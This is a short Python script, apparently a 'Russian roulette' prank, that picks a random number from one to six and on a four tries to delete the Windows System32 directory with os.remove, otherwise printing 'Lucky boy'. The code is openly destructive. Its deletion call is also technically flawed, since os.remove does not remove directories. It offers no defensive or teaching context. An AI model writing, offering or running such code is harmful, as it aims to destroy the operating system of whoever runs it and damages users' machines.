import os
import random

r = random.randrange(1, 7)
if r == 4:
  os.remove("C:\Windows\System32")
else:
  print("Lucky boy")
